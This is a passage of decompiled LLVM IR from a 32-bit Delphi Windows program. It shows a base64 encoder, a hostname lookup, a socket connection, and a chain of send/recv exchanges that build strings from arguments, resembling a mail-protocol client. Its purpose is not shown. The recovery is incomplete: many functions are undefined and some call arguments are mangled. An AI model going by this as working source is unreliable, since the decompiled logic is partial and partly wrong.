  %48 = load i8, i8* %40, align 1, !insn.addr !927
  %49 = mul i8 %48, 4, !insn.addr !928
  %50 = and i8 %49, 60, !insn.addr !929
  %51 = add i32 %28, 2, !insn.addr !930
  %52 = inttoptr i32 %51 to i8*, !insn.addr !930
  %53 = load i8, i8* %52, align 1, !insn.addr !930
  %54 = udiv i8 %53, 64, !insn.addr !931
  %55 = or i8 %54, %50, !insn.addr !932
  %56 = zext i8 %55 to i32, !insn.addr !932
  %57 = add i32 %56, ptrtoint ([64 x i8]* @B64EncodeTable_at_4055e8 to i32), !insn.addr !933
  %58 = inttoptr i32 %57 to i8*, !insn.addr !933
  %59 = load i8, i8* %58, align 1, !insn.addr !933
  store i8 %59, i8* %9, align 1, !insn.addr !934
  %60 = and i8 %53, 63, !insn.addr !935
  %61 = zext i8 %60 to i32, !insn.addr !935
  %62 = add i32 %61, ptrtoint ([64 x i8]* @B64EncodeTable_at_4055e8 to i32), !insn.addr !936
  %63 = inttoptr i32 %62 to i8*, !insn.addr !936
  %64 = load i8, i8* %63, align 1, !insn.addr !936
  store i8 %64, i8* %11, align 1, !insn.addr !937
  br label %dec_label_pc_4057e9, !insn.addr !938

dec_label_pc_40573e:                              ; preds = %dec_label_pc_40569e
  %65 = add i32 %24, 2, !insn.addr !939
  %66 = icmp sgt i32 %65, %26, !insn.addr !940
  %67 = add i32 %24, %0
  %68 = inttoptr i32 %67 to i8*
  %69 = load i8, i8* %68, align 1
  %70 = udiv i8 %69, 4
  %71 = zext i8 %70 to i32
  %72 = add i32 %71, ptrtoint ([64 x i8]* @B64EncodeTable_at_4055e8 to i32)
  %73 = inttoptr i32 %72 to i8*
  %74 = load i8, i8* %73, align 1
  store i8 %74, i8* %5, align 1
  %75 = load i8, i8* %68, align 1
  br i1 %66, label %dec_label_pc_4057ad, label %dec_label_pc_405748, !insn.addr !940

dec_label_pc_405748:                              ; preds = %dec_label_pc_40573e
  %76 = mul i8 %75, 16, !insn.addr !941
  %77 = and i8 %76, 48, !insn.addr !942
  %78 = add i32 %67, 1, !insn.addr !943
  %79 = inttoptr i32 %78 to i8*, !insn.addr !943
  %80 = load i8, i8* %79, align 1, !insn.addr !943
  %81 = zext i8 %80 to i32, !insn.addr !943
  %82 = udiv i8 %80, 16, !insn.addr !944
  %83 = or i8 %82, %77, !insn.addr !945
  %84 = zext i8 %83 to i32, !insn.addr !945
  %85 = add i32 %84, ptrtoint ([64 x i8]* @B64EncodeTable_at_4055e8 to i32), !insn.addr !946
  %86 = inttoptr i32 %85 to i8*, !insn.addr !946
  %87 = load i8, i8* %86, align 1, !insn.addr !946
  store i8 %87, i8* %7, align 1, !insn.addr !947
  %88 = mul i32 %81, 4, !insn.addr !948
  %89 = and i32 %88, 60, !insn.addr !949
  %90 = add i32 %89, ptrtoint ([64 x i8]* @B64EncodeTable_at_4055e8 to i32), !insn.addr !950
  %91 = inttoptr i32 %90 to i8*, !insn.addr !950
  %92 = load i8, i8* %91, align 4, !insn.addr !950
  store i8 %92, i8* %9, align 1, !insn.addr !951
  store i8 61, i8* %11, align 1, !insn.addr !952
  br label %dec_label_pc_4057e9, !insn.addr !953

dec_label_pc_4057ad:                              ; preds = %dec_label_pc_40573e
  %93 = zext i8 %75 to i32, !insn.addr !954
  %94 = mul i32 %93, 16, !insn.addr !955
  %95 = and i32 %94, 48, !insn.addr !956
  %96 = add i32 %95, ptrtoint ([64 x i8]* @B64EncodeTable_at_4055e8 to i32), !insn.addr !957
  %97 = inttoptr i32 %96 to i8*, !insn.addr !957
  %98 = load i8, i8* %97, align 16, !insn.addr !957
  store i8 %98, i8* %7, align 1, !insn.addr !958
  store i8 61, i8* %9, align 1, !insn.addr !959
  store i8 61, i8* %11, align 1, !insn.addr !960
  br label %dec_label_pc_4057e9, !insn.addr !960

dec_label_pc_4057e9:                              ; preds = %dec_label_pc_4057ad, %dec_label_pc_405748, %dec_label_pc_4056af
  %99 = load i32, i32* %13, align 4, !insn.addr !912
  %100 = inttoptr i32 %99 to i32*, !insn.addr !961
  %101 = load i32, i32* %100, align 4, !insn.addr !961
  %102 = add i32 %esp.0.reload, -4, !insn.addr !961
  %103 = inttoptr i32 %102 to i32*, !insn.addr !961
  store i32 %101, i32* %103, align 4, !insn.addr !961
  %104 = call i32 @"@LStrFromChar"(), !insn.addr !962
  %105 = load i32, i32* %15, align 4, !insn.addr !963
  %106 = add i32 %esp.0.reload, -8, !insn.addr !963
  %107 = inttoptr i32 %106 to i32*, !insn.addr !963
  store i32 %105, i32* %107, align 4, !insn.addr !963
  %108 = call i32 @"@LStrFromChar"(), !insn.addr !964
  %109 = load i32, i32* %17, align 4, !insn.addr !965
  %110 = add i32 %esp.0.reload, -12, !insn.addr !965
  %111 = inttoptr i32 %110 to i32*
  store i32 %109, i32* %111, align 4, !insn.addr !965
  %112 = call i32 @"@LStrFromChar"(), !insn.addr !966
  %113 = load i32, i32* %19, align 4, !insn.addr !967
  %114 = add i32 %esp.0.reload, -16, !insn.addr !967
  %115 = inttoptr i32 %114 to i32*, !insn.addr !967
  store i32 %113, i32* %115, align 4, !insn.addr !967
  %116 = call i32 @"@LStrFromChar"(), !insn.addr !968
  %117 = load i32, i32* %21, align 4, !insn.addr !969
  %118 = add i32 %esp.0.reload, -20, !insn.addr !969
  %119 = inttoptr i32 %118 to i32*
  store i32 %117, i32* %119, align 4, !insn.addr !969
  %120 = call i32 @"@LStrCatN"(), !insn.addr !970
  %121 = add i32 %ebx.0.reload, 1, !insn.addr !971
  %122 = load i32, i32* %23, align 4, !insn.addr !972
  %123 = add i32 %122, -1, !insn.addr !972
  %124 = icmp eq i32 %123, 0, !insn.addr !972
  store i32 %123, i32* %23, align 4, !insn.addr !972
  %125 = icmp eq i1 %124, false, !insn.addr !973
  store i32 %118, i32* %esp.0.reg2mem, !insn.addr !973
  store i32 %121, i32* %ebx.0.reg2mem, !insn.addr !973
  br i1 %125, label %dec_label_pc_40569e, label %dec_label_pc_40583d, !insn.addr !973

dec_label_pc_40583d:                              ; preds = %dec_label_pc_4057e9
  %126 = load i32, i32* %119, align 4, !insn.addr !974
  call void @__writefsdword(i32 0, i32 %126), !insn.addr !975
  store i32 4216927, i32* %111, align 4, !insn.addr !976
  %127 = call i32 @"@LStrArrayClr"(), !insn.addr !977
  ret i32 %127, !insn.addr !978
}

define i32 @function_405858() local_unnamed_addr {
dec_label_pc_405858:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !979
  ret i32 %0, !insn.addr !979
}

define i32 @function_40585d() local_unnamed_addr {
dec_label_pc_40585d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !980
}

define i32 @function_40585f(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40585f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !981
}

define i32 @function_405868() local_unnamed_addr {
dec_label_pc_405868:
  %stack_var_-12.0.reg2mem = alloca i32, !insn.addr !982
  %0 = call i32 @function_4036c8(), !insn.addr !983
  %1 = inttoptr i32 %0 to i8*, !insn.addr !984
  %2 = call %hostent* @gethostbyname(i8* %1), !insn.addr !985
  %3 = call i32 @"@FillChar"(), !insn.addr !986
  %4 = icmp eq %hostent* %2, null, !insn.addr !987
  br i1 %4, label %dec_label_pc_4058b3, label %dec_label_pc_405891, !insn.addr !988

dec_label_pc_405891:                              ; preds = %dec_label_pc_405868
  %5 = ptrtoint %hostent* %2 to i32, !insn.addr !985
  %6 = add i32 %5, 12, !insn.addr !989
  %7 = inttoptr i32 %6 to i32*, !insn.addr !989
  %8 = load i32, i32* %7, align 4, !insn.addr !989
  %9 = inttoptr i32 %8 to i32*, !insn.addr !990
  %10 = load i32, i32* %9, align 4, !insn.addr !990
  %11 = inttoptr i32 %10 to i8*, !insn.addr !991
  %12 = load i8, i8* %11, align 1, !insn.addr !991
  %13 = sext i8 %12 to i32, !insn.addr !992
  store i32 %13, i32* %stack_var_-12.0.reg2mem, !insn.addr !993
  br label %dec_label_pc_4058b3, !insn.addr !993

dec_label_pc_4058b3:                              ; preds = %dec_label_pc_405891, %dec_label_pc_405868
  %stack_var_-12.0.reload = load i32, i32* %stack_var_-12.0.reg2mem
  ret i32 %stack_var_-12.0.reload, !insn.addr !994
}

define i32 @function_4058c4() local_unnamed_addr {
dec_label_pc_4058c4:
  %esp.0.reg2mem = alloca i32, !insn.addr !995
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-488 = alloca i32, align 4
  %stack_var_-472 = alloca i32, align 4
  %stack_var_-412 = alloca i32, align 4
  %stack_var_-452 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !996
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !997
  store i32 %2, i32* %stack_var_-452, align 4, !insn.addr !997
  %3 = ptrtoint i32* %stack_var_-452 to i32, !insn.addr !997
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !998
  %4 = ptrtoint i32* %stack_var_-412 to i32, !insn.addr !999
  %5 = trunc i32 %4 to i16, !insn.addr !999
  %6 = call i32 @WSAStartup(i16 %5, %WSAData* inttoptr (i32 257 to %WSAData*)), !insn.addr !1000
  store i32 2, i32* %stack_var_-472, align 4, !insn.addr !1001
  %7 = ptrtoint i32* %stack_var_-472 to i32, !insn.addr !1001
  %8 = call i32 @socket(i32 0, i32 1, i32 2), !insn.addr !1002
  %9 = icmp eq i32 %8, -1, !insn.addr !1003
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1004
  br i1 %9, label %dec_label_pc_405952, label %dec_label_pc_405913, !insn.addr !1004

dec_label_pc_405913:                              ; preds = %dec_label_pc_4058c4
  %10 = call i32 @function_405868(), !insn.addr !1005
  %11 = trunc i32 %10 to i16, !insn.addr !1006
  %12 = call i16 @htons(i16 %11), !insn.addr !1006
  store i32 %8, i32* %stack_var_-488, align 4, !insn.addr !1007
  %13 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !1007
  %14 = sext i16 %12 to i32, !insn.addr !1008
  %15 = call i32 @connect(i32 %14, %sockaddr* bitcast (i32* @0 to %sockaddr*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1008
  %16 = icmp eq i32 %15, 0, !insn.addr !1009
  %17 = icmp eq i1 %16, false, !insn.addr !1010
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !1010
  br i1 %17, label %dec_label_pc_405952, label %dec_label_pc_40594a, !insn.addr !1010

dec_label_pc_40594a:                              ; preds = %dec_label_pc_405913
  %18 = inttoptr i32 %0 to i32*, !insn.addr !1011
  store i32 %8, i32* %18, align 4, !insn.addr !1011
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !1012
  br label %dec_label_pc_405952, !insn.addr !1012

dec_label_pc_405952:                              ; preds = %dec_label_pc_40594a, %dec_label_pc_405913, %dec_label_pc_4058c4
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %19 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1013
  %20 = load i32, i32* %19, align 4, !insn.addr !1013
  call void @__writefsdword(i32 0, i32 %20), !insn.addr !1014
  %21 = add i32 %esp.0.reload, 8, !insn.addr !1015
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1015
  store i32 4217199, i32* %22, align 4, !insn.addr !1015
  %23 = call i32 @"@LStrClr"(), !insn.addr !1016
  ret i32 %23, !insn.addr !1017
}

define i32 @function_405968() local_unnamed_addr {
dec_label_pc_405968:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1018
  ret i32 %0, !insn.addr !1018
}

define i32 @function_40596d() local_unnamed_addr {
dec_label_pc_40596d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1019
}

define i32 @function_40596f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40596f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1020
}

define i32 @function_405978() local_unnamed_addr {
dec_label_pc_405978:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @closesocket(i32 %0), !insn.addr !1021
  %2 = call i32 @WSACleanup(), !insn.addr !1022
  ret i32 %2, !insn.addr !1023
}

define i32 @function_405984() local_unnamed_addr {
dec_label_pc_405984:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4105 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !1024
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1025
  store i32 %2, i32* %stack_var_-4124, align 4, !insn.addr !1025
  %3 = ptrtoint i32* %stack_var_-4124 to i32, !insn.addr !1025
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1026
  %4 = call i32 @function_4036c8(), !insn.addr !1027
  %5 = call i32 @StrCopy(), !insn.addr !1028
  %6 = call i32 @function_407284(i32 4), !insn.addr !1029
  %7 = bitcast i32* %stack_var_-4105 to i8*
  %8 = call i32 @send(i32 %6, i8* nonnull %7, i32 %0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1030
  call void @__writefsdword(i32 0, i32 %0), !insn.addr !1031
  %9 = call i32 @"@LStrClr"(), !insn.addr !1032
  ret i32 %9, !insn.addr !1033
}

define i32 @function_4059f5() local_unnamed_addr {
dec_label_pc_4059f5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1034
  ret i32 %0, !insn.addr !1034
}

define i32 @function_4059fa() local_unnamed_addr {
dec_label_pc_4059fa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1035
}

define i32 @function_4059fc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4059fc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1036
}

define i32 @function_405a04() local_unnamed_addr {
dec_label_pc_405a04:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @recv(i32 %0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1037
  %2 = call i32 @StrPas(), !insn.addr !1038
  ret i32 %2, !insn.addr !1039
}

define i32 @function_405a30(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_405a30:
  %esp.1.reg2mem = alloca i32, !insn.addr !1040
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1040
  %esp.0.reg2mem = alloca i32, !insn.addr !1040
  %ecx.0.reg2mem = alloca i32, !insn.addr !1040
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1041
  store i32 8, i32* %ecx.0.reg2mem, !insn.addr !1042
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1042
  br label %dec_label_pc_405a39, !insn.addr !1042

dec_label_pc_405a39:                              ; preds = %dec_label_pc_405a39, %dec_label_pc_405a30
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1043
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1043
  store i32 0, i32* %2, align 4, !insn.addr !1043
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1044
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1044
  store i32 0, i32* %4, align 4, !insn.addr !1044
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1045
  %6 = icmp eq i32 %5, 0, !insn.addr !1045
  %7 = icmp eq i1 %6, false, !insn.addr !1046
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1046
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1046
  br i1 %7, label %dec_label_pc_405a39, label %dec_label_pc_405a40, !insn.addr !1046

dec_label_pc_405a40:                              ; preds = %dec_label_pc_405a39
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1047
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1047
  store i32 0, i32* %9, align 4, !insn.addr !1047
  %10 = call i32 @function_4036b8(), !insn.addr !1048
  %11 = call i32 @function_4036b8(), !insn.addr !1049
  %12 = call i32 @function_4036b8(), !insn.addr !1050
  %13 = call i32 @function_4036b8(), !insn.addr !1051
  %14 = call i32 @function_4036b8(), !insn.addr !1052
  %15 = call i32 @function_4036b8(), !insn.addr !1053
  %16 = call i32 @function_4036b8(), !insn.addr !1054
  %17 = add i32 %esp.0.reload, -20, !insn.addr !1055
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1055
  %19 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1055
  store i32 %19, i32* %18, align 4, !insn.addr !1055
  %20 = add i32 %esp.0.reload, -24, !insn.addr !1056
  %21 = inttoptr i32 %20 to i32*, !insn.addr !1056
  store i32 4218021, i32* %21, align 4, !insn.addr !1056
  %22 = call i32 @__readfsdword(i32 0), !insn.addr !1057
  %23 = add i32 %esp.0.reload, -28, !insn.addr !1057
  %24 = inttoptr i32 %23 to i32*
  store i32 %22, i32* %24, align 4, !insn.addr !1057
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1058
  %25 = call i32 @function_4058c4(), !insn.addr !1059
  %26 = icmp eq i32 %25, 0, !insn.addr !1060
  store i32* %24, i32** %.pre-phi.reg2mem, !insn.addr !1061
  store i32 %23, i32* %esp.1.reg2mem, !insn.addr !1061
  br i1 %26, label %dec_label_pc_405c70, label %dec_label_pc_405aae, !insn.addr !1061

dec_label_pc_405aae:                              ; preds = %dec_label_pc_405a40
  %27 = add i32 %esp.0.reload, -32, !insn.addr !1062
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1062
  store i32 ptrtoint ([6 x i8]* @global_var_405cc0 to i32), i32* %28, align 4, !insn.addr !1062
  %29 = add i32 %esp.0.reload, -36, !insn.addr !1063
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1063
  %31 = add i32 %esp.0.reload, -40, !insn.addr !1064
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1064
  store i32 ptrtoint ([3 x i8]* @global_var_405cd0 to i32), i32* %32, align 4, !insn.addr !1064
  %33 = call i32 @"@LStrCatN"(), !insn.addr !1065
  %34 = call i32 @function_405984(), !insn.addr !1066
  %35 = call i32 @function_405a04(), !insn.addr !1067
  %36 = call i32 @function_405984(), !insn.addr !1068
  %37 = call i32 @function_405a04(), !insn.addr !1069
  %38 = call i32 @"@LStrCat"(), !insn.addr !1070
  %39 = call i32 @function_405984(), !insn.addr !1071
  %40 = call i32 @function_405a04(), !insn.addr !1072
  %41 = call i32 @"@LStrCat"(), !insn.addr !1073
  %42 = call i32 @function_405984(), !insn.addr !1074
  %43 = call i32 @function_405a04(), !insn.addr !1075
  %44 = add i32 %esp.0.reload, -44, !insn.addr !1076
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1076
  store i32 ptrtoint ([13 x i8]* @global_var_405cf4 to i32), i32* %45, align 4, !insn.addr !1076
  %46 = add i32 %esp.0.reload, -48, !insn.addr !1077
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1077
  store i32 %arg1, i32* %47, align 4, !insn.addr !1077
  %48 = add i32 %esp.0.reload, -52, !insn.addr !1078
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1078
  store i32 ptrtoint (i32* @global_var_405d0c to i32), i32* %49, align 4, !insn.addr !1078
  %50 = add i32 %esp.0.reload, -56, !insn.addr !1079
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1079
  store i32 ptrtoint ([3 x i8]* @global_var_405cd0 to i32), i32* %51, align 4, !insn.addr !1079
  %52 = call i32 @"@LStrCatN"(), !insn.addr !1080
  %53 = call i32 @function_405984(), !insn.addr !1081
  %54 = call i32 @function_405a04(), !insn.addr !1082
  %55 = add i32 %esp.0.reload, -60, !insn.addr !1083
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1083
  store i32 ptrtoint ([11 x i8]* @global_var_405d18 to i32), i32* %56, align 4, !insn.addr !1083
  %57 = add i32 %esp.0.reload, -64, !insn.addr !1084
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1084
  store i32 %arg2, i32* %58, align 4, !insn.addr !1084
  %59 = add i32 %esp.0.reload, -68, !insn.addr !1085
  %60 = inttoptr i32 %59 to i32*, !insn.addr !1085
  store i32 ptrtoint (i32* @global_var_405d0c to i32), i32* %60, align 4, !insn.addr !1085
  %61 = add i32 %esp.0.reload, -72, !insn.addr !1086
  %62 = inttoptr i32 %61 to i32*, !insn.addr !1086
  store i32 ptrtoint ([3 x i8]* @global_var_405cd0 to i32), i32* %62, align 4, !insn.addr !1086
  %63 = call i32 @"@LStrCatN"(), !insn.addr !1087
  %64 = call i32 @function_405984(), !insn.addr !1088
  %65 = call i32 @function_405a04(), !insn.addr !1089
  %66 = call i32 @function_405984(), !insn.addr !1090
  %67 = call i32 @function_405a04(), !insn.addr !1091
  %68 = add i32 %esp.0.reload, -76, !insn.addr !1092
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1092
  store i32 ptrtoint ([8 x i8]* @global_var_405d3c to i32), i32* %69, align 4, !insn.addr !1092
  %70 = add i32 %esp.0.reload, -80, !insn.addr !1093
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1093
  store i32 %arg1, i32* %71, align 4, !insn.addr !1093
  %72 = add i32 %esp.0.reload, -84, !insn.addr !1094
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1094
  store i32 ptrtoint (i32* @global_var_405d0c to i32), i32* %73, align 4, !insn.addr !1094
  %74 = add i32 %esp.0.reload, -88, !insn.addr !1095
  %75 = inttoptr i32 %74 to i32*, !insn.addr !1095
  store i32 ptrtoint ([3 x i8]* @global_var_405cd0 to i32), i32* %75, align 4, !insn.addr !1095
  %76 = add i32 %esp.0.reload, -92, !insn.addr !1096
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1096
  store i32 ptrtoint ([6 x i8]* @global_var_405d4c to i32), i32* %77, align 4, !insn.addr !1096
  %78 = add i32 %esp.0.reload, -96, !insn.addr !1097
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1097
  store i32 %arg2, i32* %79, align 4, !insn.addr !1097
  %80 = add i32 %esp.0.reload, -100, !insn.addr !1098
  %81 = inttoptr i32 %80 to i32*, !insn.addr !1098
  store i32 ptrtoint (i32* @global_var_405d0c to i32), i32* %81, align 4, !insn.addr !1098
  %82 = add i32 %esp.0.reload, -104, !insn.addr !1099
  %83 = inttoptr i32 %82 to i32*, !insn.addr !1099
  store i32 ptrtoint ([3 x i8]* @global_var_405cd0 to i32), i32* %83, align 4, !insn.addr !1099
  %84 = add i32 %esp.0.reload, -108, !insn.addr !1100
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1100
  store i32 ptrtoint ([10 x i8]* @global_var_405d5c to i32), i32* %85, align 4, !insn.addr !1100
  %86 = add i32 %esp.0.reload, -112, !insn.addr !1101
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1101
  store i32 %arg3, i32* %87, align 4, !insn.addr !1101
  %88 = add i32 %esp.0.reload, -116, !insn.addr !1102
  %89 = inttoptr i32 %88 to i32*, !insn.addr !1102
  store i32 ptrtoint ([3 x i8]* @global_var_405cd0 to i32), i32* %89, align 4, !insn.addr !1102
  %90 = add i32 %esp.0.reload, -120, !insn.addr !1103
  %91 = inttoptr i32 %90 to i32*, !insn.addr !1103
  store i32 ptrtoint ([3 x i8]* @global_var_405cd0 to i32), i32* %91, align 4, !insn.addr !1103
  %92 = add i32 %esp.0.reload, -124, !insn.addr !1104
  %93 = inttoptr i32 %92 to i32*, !insn.addr !1104
  store i32 %arg4, i32* %93, align 4, !insn.addr !1104
  %94 = add i32 %esp.0.reload, -128, !insn.addr !1105
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1105
  store i32 ptrtoint ([3 x i8]* @global_var_405cd0 to i32), i32* %95, align 4, !insn.addr !1105
  %96 = add i32 %esp.0.reload, -132, !insn.addr !1106
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1106
  store i32 ptrtoint (i32* @global_var_405d70 to i32), i32* %97, align 4, !insn.addr !1106
  %98 = add i32 %esp.0.reload, -136, !insn.addr !1107
  %99 = inttoptr i32 %98 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_405cd0 to i32), i32* %99, align 4, !insn.addr !1107
  %100 = call i32 @"@LStrCatN"(), !insn.addr !1108
  %101 = call i32 @function_405984(), !insn.addr !1109
  %102 = call i32 @function_405a04(), !insn.addr !1110
  %103 = call i32 @function_405984(), !insn.addr !1111
  %104 = call i32 @function_405a04(), !insn.addr !1112
  %105 = call i32 @function_405978(), !insn.addr !1113
  store i32* %99, i32** %.pre-phi.reg2mem, !insn.addr !1114
  store i32 %98, i32* %esp.1.reg2mem, !insn.addr !1114
  br label %dec_label_pc_405c70, !insn.addr !1114

dec_label_pc_405c70:                              ; preds = %dec_label_pc_405aae, %dec_label_pc_405a40
  %106 = add i32 %esp.0.reload, -16, !insn.addr !1115
  %107 = inttoptr i32 %106 to i32*, !insn.addr !1115
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %108 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1116
  call void @__writefsdword(i32 0, i32 %108), !insn.addr !1117
  %109 = add i32 %esp.1.reload, 8, !insn.addr !1118
  %110 = inttoptr i32 %109 to i32*, !insn.addr !1118
  store i32 4218028, i32* %110, align 4, !insn.addr !1118
  %111 = call i32 @"@LStrArrayClr"(), !insn.addr !1119
  %112 = call i32 @"@LStrArrayClr"(), !insn.addr !1120
  %113 = call i32 @"@LStrArrayClr"(), !insn.addr !1121
  ret i32 %113, !insn.addr !1122
}

define i32 @function_405ca5() local_unnamed_addr {
dec_label_pc_405ca5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1123
  ret i32 %0, !insn.addr !1123
}

define i32 @function_405caa() local_unnamed_addr {
dec_label_pc_405caa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1124
}

define i32 @function_405cac(i32 %arg1) local_unnamed_addr {
dec_label_pc_405cac:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1125
}

define i32 @function_405d77() local_unnamed_addr {
dec_label_pc_405d77:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1126
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1126
  store i32 %3, i32* %4, align 4, !insn.addr !1126
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1127
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1127
  %9 = add i8 %6, %8, !insn.addr !1127
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1127
  store i8 %9, i8* %10, align 1, !insn.addr !1127
  %11 = add i32 %2, 85, !insn.addr !1128
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1128
  %13 = load i8, i8* %12, align 1, !insn.addr !1128
  %14 = trunc i32 %1 to i8, !insn.addr !1128
  %15 = add i8 %13, %14, !insn.addr !1128
  store i8 %15, i8* %12, align 1, !insn.addr !1128
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1129
  store i32 %16, i32* %stack_var_-16, align 4, !insn.addr !1129
  %17 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1129
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1130
  %18 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !1131
  %19 = add i32 %18, 1, !insn.addr !1131
  %20 = icmp eq i32 %19, 0, !insn.addr !1131
  store i32 %19, i32* @global_var_4096bc, align 4, !insn.addr !1131
  %21 = icmp eq i1 %20, false, !insn.addr !1132
  br i1 %21, label %dec_label_pc_405db1, label %dec_label_pc_405d9d, !insn.addr !1132

dec_label_pc_405d9d:                              ; preds = %dec_label_pc_405d77
  %22 = call i32 @"@LStrClr"(), !insn.addr !1133
  %23 = call i32 @"@LStrClr"(), !insn.addr !1134
  br label %dec_label_pc_405db1, !insn.addr !1134

dec_label_pc_405db1:                              ; preds = %dec_label_pc_405d9d, %dec_label_pc_405d77
  %24 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1135
  call void @__writefsdword(i32 0, i32 %24), !insn.addr !1136
  ret i32 0, !insn.addr !1137
}

define i32 @function_405dbf() local_unnamed_addr {
dec_label_pc_405dbf:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1138
  ret i32 %0, !insn.addr !1138
}

define i32 @function_405dc4() local_unnamed_addr {
dec_label_pc_405dc4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1139
}

define i32 @function_405dc6(i32 %arg1) local_unnamed_addr {
dec_label_pc_405dc6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1140
}

define i32 @function_405dc8() local_unnamed_addr {
dec_label_pc_405dc8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !1141
  %2 = add i32 %1, -1, !insn.addr !1141
  store i32 %2, i32* @global_var_4096bc, align 4, !insn.addr !1141
  ret i32 %0, !insn.addr !1142
}

define i32 @function_405dd0() local_unnamed_addr {
dec_label_pc_405dd0:
  %esp.0.reg2mem = alloca i32, !insn.addr !1143
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
